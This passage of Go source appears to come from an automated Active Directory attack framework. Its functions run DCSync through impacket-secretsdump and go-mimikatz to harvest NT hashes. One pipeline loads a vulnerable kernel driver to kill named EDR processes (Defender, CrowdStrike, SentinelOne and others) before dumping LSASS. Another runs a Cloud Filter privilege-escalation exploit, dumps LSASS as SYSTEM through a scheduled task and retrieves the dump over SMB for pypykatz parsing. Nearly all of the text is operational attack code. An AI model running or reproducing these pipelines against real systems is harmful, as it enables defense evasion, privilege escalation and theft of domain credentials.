	domain, user, pass, _ := getCredential(state)
	if domain == "" || user == "" {
		result.Success = false
		return result
	}

	fmt.Printf("[*] DCSync via impacket-secretsdump against %s...\n", host.IP)
	target := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, host.IP)
	args := []string{target, "-just-dc"}
	r := utils.RunCommand("impacket-secretsdump", args...)
	if r.Success {
		result.RawOutput = r.Stdout
		creds := parseSecretsdumpOutput(r.Stdout, domain)
		result.Creds = append(result.Creds, creds...)
		for _, c := range creds {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "secretsdump", Key: c.Username + "@" + c.Domain,
				Value: c.Secret, Confidence: 0.9,
				RawOutput: r.Stdout, Timestamp: time.Now(),
			})
		}
		fmt.Printf("[+] Secretsdump: %d credentials found\n", len(creds))
	} else {
		result.Success = false
		fmt.Printf("[!] Secretsdump failed: %s\n", r.Stderr)
	}
	return result
}

func parseSecretsdumpOutput(output, domain string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, ":::") && !strings.HasPrefix(trimmed, "[") {
			parts := strings.SplitN(trimmed, ":", 4)
			if len(parts) >= 4 {
				username := parts[0]
				if strings.Contains(username, "\\") {
					parts2 := strings.SplitN(username, "\\", 2)
					username = parts2[1]
				}
				nthash := strings.TrimSpace(strings.SplitN(parts[3], ":::", 2)[0])
				if nthash != "" && !strings.Contains(nthash, " ") && len(nthash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: username,
						Domain: domain, Hash: nthash, Secret: nthash,
						Source: "secretsdump",
					})
				}
			}
		}
	}
	return creds
}

func sanitizeMimikatzCommand(cmd string) string {
	var safe []rune
	for _, r := range cmd {
		if unicode.IsLetter(r) || unicode.IsDigit(r) || r == ':' || r == ' ' || r == '_' || r == '-' {
			safe = append(safe, r)
		}
	}
	return string(safe)
}

func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for PhantomKiller pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	if !tools.PhantomKiller.Available() {
		fmt.Println("[!] PhantomKiller not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	ctx := context.Background()

	fmt.Println("[*] PhantomKiller: Deploying BootRepair.sys (randomized name)...")
	driverPath, drvSha, err := tools.Deploy(ctx, target, "BootRepair.sys", `C:\Windows\Temp\`, "")
	if err != nil {
		fmt.Printf("[!] Failed to deploy BootRepair.sys: %v\n", err)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "driver upload failed: " + err.Error(),
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] PhantomKiller: Deploying PhantomKiller.exe (randomized name)...")
	killerPath, _, kerr := tools.Deploy(ctx, target, "PhantomKiller.exe", `C:\Windows\Temp\`, "")
	if kerr != nil {
		fmt.Printf("[!] Failed to deploy PhantomKiller.exe: %v\n", kerr)
		_ = tools.CleanupRemote(ctx, target, driverPath)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "killer upload failed: " + kerr.Error(),
			Timestamp: time.Now(),
		})
		return result
	}

	// Stop, brief settle delay (services occasionally linger in STOP_PENDING for
	// a second or two), then delete. Issued as independent calls so a stop
	// failure doesn't prevent the delete from removing the SCM entry.
	defer func() {
		tools.NetExec.RunFailover(ctx, target, `sc.exe stop PhantomKiller`, 15*time.Second)
		time.Sleep(2 * time.Second)
		tools.NetExec.RunFailover(ctx, target, `sc.exe delete PhantomKiller`, 15*time.Second)
		_ = tools.CleanupRemote(ctx, target, driverPath, killerPath)
	}()

	fmt.Printf("[*] PhantomKiller: Loading kernel driver (sha256:%s…)...\n", tools.ShortHash(drvSha, 16))
	loadCmd := fmt.Sprintf(`sc.exe create PhantomKiller binPath="%s" type=kernel && sc.exe start PhantomKiller`, driverPath)
	loadR, lerr := tools.NetExec.RunFailover(ctx, target, loadCmd, 30*time.Second)
	if lerr != nil || !loadR.Success {
		fmt.Println("[!] Failed to load PhantomKiller driver")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "failed to load driver",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] PhantomKiller: Enumerating EDR processes...")
	edrProcs := []string{"MsMpEng.exe", "CSFalconService.exe", "SentinelService.exe", "CylanceSvc.exe",
		"SophosMgr.exe", "TaniumClient.exe", "CarbonBlack.exe", "CrowdStrike.exe", "McAfee.exe", "Symantec.exe"}
	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR, perr := tools.NetExec.RunFailover(ctx, target, pidCmd, 30*time.Second)
		if perr == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
			pid := strings.TrimSpace(pidR.Stdout)
			if !isNumeric(pid) {
				fmt.Printf("[!] PhantomKiller: Invalid PID from remote: %q, skipping\n", pid)
				continue
			}
			fmt.Printf("[*] PhantomKiller: Found %s PID %s, killing via IOCTL...\n", proc, pid)
			pidInt := 0
			fmt.Sscanf(pid, "%d", &pidInt)
			if pidInt > 0 {
				killR, _ := tools.PhantomKiller.ExecRemote(ctx, target, killerPath, tools.PhantomKillerModeKill, pidInt)
				_ = killR
			}
		}
	}

	fmt.Println("[*] PhantomKiller: Dumping LSASS with nanodump...")
	dump := executeNanodumpPipeline(state, host, pipeline)
	result.Success = dump.Success
	result.Evidence = append(result.Evidence, dump.Evidence...)
	result.Creds = append(result.Creds, dump.Creds...)

	return result
}

func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for MiniPlasma pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "miniplasma", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	if !tools.MiniPlasma.Available() {
		fmt.Println("[!] MiniPlasma not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline)
	}

	ctx := context.Background()

	fmt.Println("[*] MiniPlasma: Deploying dependency DLLs (NtApiDotNet + TaskScheduler)...")
	var depPaths []string
	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
		rp, _, err := tools.Deploy(ctx, target, lib, `C:\Windows\Temp\`, "")
		if err != nil {
			fmt.Printf("[!] MiniPlasma dep %s deploy failed: %v\n", lib, err)
			_ = tools.CleanupRemote(ctx, target, depPaths...)
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "miniplasma", Key: "deploy_error",
				Value:     lib + " deploy failed: " + err.Error(),
				Timestamp: time.Now(),
			})
			return result
		}
		depPaths = append(depPaths, rp)
	}

	fmt.Println("[*] MiniPlasma: Deploying MiniPlasma.exe (randomized name)...")
	exploitPath, expSha, err := tools.Deploy(ctx, target, "MiniPlasma.exe", `C:\Windows\Temp\`, "")
	if err != nil {
		fmt.Printf("[!] Failed to deploy MiniPlasma.exe: %v\n", err)
		_ = tools.CleanupRemote(ctx, target, depPaths...)
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "miniplasma", Key: "error",
			Value:     "exploit upload failed: " + err.Error(),
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] MiniPlasma: Deploying nanodump.exe (randomized name)...")
	dumperPath, _, derr := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
	if derr != nil {
		fmt.Printf("[!] Failed to deploy nanodump.exe: %v — falling back to nanodump pipeline\n", derr)
		_ = tools.CleanupRemote(ctx, target, append(depPaths, exploitPath)...)
		return executeNanodumpPipeline(state, host, pipeline)
	}

	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_eop_%d.dmp`, time.Now().UnixNano())
	defer func() {
		_ = tools.CleanupRemote(ctx, target, append(depPaths, exploitPath, dumperPath, dumpRemote)...)
	}()

	fmt.Printf("[*] MiniPlasma: Executing Cloud Filter EoP exploit (sha256:%s…)...\n", tools.ShortHash(expSha, 16))
	execR, err := tools.NetExec.RunFailover(ctx, target, exploitPath, 60*time.Second)
	if err != nil || !execR.Success {
		fmt.Println("[!] MiniPlasma exploit did not return success")
		result.Success = false
		return result
	}

	fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS as SYSTEM via schtasks...")
	dumpCmd := fmt.Sprintf(
		`schtasks /create /tn "MiniDump" /tr "%s --write %s --fork" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn "MiniDump" && ping -n 6 127.0.0.1 >NUL && schtasks /delete /tn "MiniDump" /f`,
		dumperPath, dumpRemote)
	execDumpR, errDump := tools.NetExec.RunFailover(ctx, target, dumpCmd, 90*time.Second)
	if errDump != nil || !execDumpR.Success {
		fmt.Printf("[!] MiniPlasma: schtasks dump failed (err=%v)\n", errDump)
		result.Success = false
		return result
	}

	fmt.Println("[*] MiniPlasma: Retrieving SYSTEM-level dump via SMB...")
	localDump := fmt.Sprintf("/tmp/lsass_eop_%d.dmp", time.Now().UnixNano())
	if getR, gerr := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump); gerr == nil && getR.Success {
		fmt.Println("[*] MiniPlasma: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "miniplasma", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
		Source: "miniplasma", Key: "eop",
		Value:      "MiniPlasma SYSTEM shell achieved (sha256:" + tools.ShortHash(expSha, 16) + ")",
		Confidence: 0.7, RawOutput: execR.Stdout,
		Timestamp: time.Now(),
	})
	return result
}

func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	if !tools.GoMimikatz.Available() {
		fmt.Println("[!] go-mimikatz not available for DCSync")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "dcsync", Key: "error", Value: "go-mimikatz not available",
			Timestamp: time.Now(),
		})
		return result
	}

	ctx := context.Background()
	synced := 0
	for _, c := range state.Creds {
		if !c.Validated {
			continue
		}
		isDA := false
		for _, u := range state.Users {
			if u.Username == c.Username && u.Domain == c.Domain && u.IsDA {
				isDA = true
				break
			}
		}
		if !isDA {
			continue
		}

		fmt.Printf("[*] DCSync for %s\\%s...\n", c.Domain, c.Username)
		req := tools.ExecutionRequest{
			Env: map[string]string{
				"DOMAIN": c.Domain,
				"USER":   c.Username,
			},
		}
		r, err := tools.GoMimikatz.SekurlsaDcsync(ctx, req)
		if err != nil {
			fmt.Printf("[!] DCSync failed for %s\\%s: %v\n", c.Domain, c.Username, err)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "dcsync", Key: c.Username + "@" + c.Domain,
				Value: "DCSync failed: " + err.Error(), Confidence: 0.5,
				Timestamp: time.Now(),
			})
			continue
		}
		if r == nil || !r.Success {
			fmt.Printf("[!] DCSync failed for %s\\%s: result unsuccessful\n", c.Domain, c.Username)
			rawOut := ""
			if r != nil {
				rawOut = r.Stdout
			}
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "dcsync", Key: c.Username + "@" + c.Domain,
				Value: "DCSync failed", Confidence: 0.5, RawOutput: rawOut,
				Timestamp: time.Now(),
			})
			continue
		}

		creds := parseMimikatzOutput(r.Stdout)
		result.Creds = append(result.Creds, creds...)
		for _, dc := range creds {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "dcsync", Key: dc.Username + "@" + dc.Domain,
				Value: dc.Secret, Confidence: 0.9, RawOutput: r.Stdout,
				Timestamp: time.Now(),
			})
		}
		synced++
	}

	if synced == 0 {
		fmt.Println("[!] No DA credentials with validated creds found for DCSync")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "dcsync", Key: "status", Value: "no DA creds available",
			Timestamp: time.Now(),
		})
	}

	fmt.Printf("[*] DCSync complete: %d DA credentials synced\n", synced)
	return result
}

func isNumeric(s string) bool {
	for _, r := range s {
		if !unicode.IsDigit(r) {
			return false
		}
	}
	return s != ""
}
